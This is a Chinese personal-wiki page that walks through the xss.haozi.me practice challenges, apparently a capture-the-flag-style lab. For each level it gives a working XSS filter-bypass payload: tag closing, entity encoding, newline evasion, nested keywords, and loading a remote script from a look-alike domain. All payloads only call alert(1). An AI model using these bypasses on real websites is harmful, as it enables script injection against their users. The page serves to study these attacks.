<!DOCTYPE HTML>
<html>
<head>
    <link rel="Stylesheet" type="text/css" href="/wiki/static/css/style.css">
    <link rel="Stylesheet" type="text/css" href="/wiki/static/css/tango.css">
    <link rel="shortcut icon" href="/wiki/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/wiki/favicon.ico" type="image/x-icon">
    <title>XSS练习 - Curtails's personal knowledge wiki</title>
    <meta name="keywords" content="Technology, CTF, Network Security"/>
    <meta name="description" content="A wiki website of Curtails when I learned new knowledgy."/>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width" />

    <script type="text/x-mathjax-config">
        MathJax.Hub.Config({
          tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
        });
        </script>
    <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>


    <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','','ga');

        ga('create', 'UA-78529611-1', 'auto');
        ga('send', 'pageview');

    </script>
</head>

<body>
<div id="container">
    
<div id="header">
  <div id="post-nav"><a href="/wiki/">Home</a>&nbsp;»&nbsp;<a href="/wiki/#Web">Web</a>&nbsp;»&nbsp;XSS练习</div>
</div>
<div class="clearfix"></div>
<div id="title">XSS练习</div>
<div id="content">
  <div class="toc"><span class="toctitle">Table of Contents</span><ul>
<li><a href="#_1">实验平台</a></li>
<li><a href="#xss-demo">xss-demo</a></li>
</ul>
</div>
<h2 id="_1">实验平台</h2>
<p>https://curtails.github.io/xss/<br />
https://xss.haozi.me</p>
<h2 id="xss-demo">xss-demo</h2>
<p><a href="https://github.com/haozi/xss-demo/">github</a><br />
<a href="https://xss.haozi.me">在线地址</a></p>
<p>拼凑所需语句即可不必关心原语句完整性？？浏览器容错性？？<br />
- 0x00 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 无任何过滤<br />
- 0x01 <code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>闭合标签<br />
- 0x02 <code>"&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code>闭合标签<br />
- 0x03 </p>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="err">`</span><span class="mi">1</span><span class="err">`</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
<span class="o">&lt;</span><span class="nx">svg</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">40</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">41</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</pre></div>


<p>正则表达式过滤() 用``绕过或实体编码的字符编码<br />
- 0x04 同0x03 </p>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="nx">svg</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">40</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">41</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
<span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">onload</span><span class="o">=</span><span class="nx">alert</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">40</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">41</span><span class="o">&gt;&lt;</span><span class="err">/iframe&gt;</span>
</pre></div>


<ul>
<li>
<p>0x05<br />
将--&gt;替换成😀 html注释<code>&lt;!--xxs---&gt;</code>或<code>&lt;!--xss--!&gt;</code><br />
payload:<code>--!&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code></p>
</li>
<li>
<p>0x06<br />
过滤<code>auto*****=</code>或<code>on*****=</code>替换为_ 可用换行符绕过</p>
</li>
</ul>
<div class="hlcode"><pre><span class="nx">onmousemove</span>
<span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="nx">type</span><span class="o">=</span><span class="nx">image</span> <span class="nx">src</span> <span class="nx">onerror</span>
<span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></div>


<ul>
<li>0x07<br />
匹配&lt;***&gt;字符串忽略大小写替换为空</li>
</ul>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="nx">svg</span><span class="o">/</span><span class="nx">onload</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">//有空格</span>
</pre></div>


<ul>
<li>0x08<br />
将<code>&lt;/style&gt;</code>替换成<code>/*坏人*/</code> 在标签&gt;之前加个空格或换行就好了</li>
</ul>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="err">/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;</span>
<span class="o">&lt;</span><span class="err">/style</span>
<span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</pre></div>


<ul>
<li>0x09<br />
输入要以https://www.segmentfault.com开头 有一种payload是在网站上存在alert(1)js脚本</li>
</ul>
<div class="hlcode"><pre><span class="nx">https</span><span class="o">:</span><span class="c1">//www.segmentfault.com.haozi.me/j.js</span>
</pre></div>


<ul>
<li>0X0b<br />
标签、域名不区分大小写</li>
</ul>
<div class="hlcode"><pre><span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">&quot;https://www.segmentfault.com.haozi.me/j.js&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
</pre></div>


<ul>
<li>0x0c<br />
正则替换script为空</li>
</ul>
<div class="hlcode"><pre><span class="nt">&lt;scrscriptipt</span> <span class="na">src=</span><span class="s">&quot;https://www.segmentfault.com.haozi.me/j.js&quot;</span><span class="nt">&gt;&lt;/scrscriptipt&gt;</span>
</pre></div>


<ul>
<li>0x0d<br />
换行加单行注释绕过</li>
</ul>
<div class="hlcode"><pre><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="o">--&gt;</span>
</pre></div>


<ul>
<li>0x0e</li>
</ul>
</div>
<div id="content-footer">Created in <span class="create-date date"> 2019-10-29 01:01 </span></div>

</div>
<div id="footer">
            <span>
                Copyright © 2019 Curtails.
                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
                Fork me in <a href="" target="_blank"> github </a>.
            </span>
</div>


<!--百度统计-->
<script>
    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>


</body>
</html>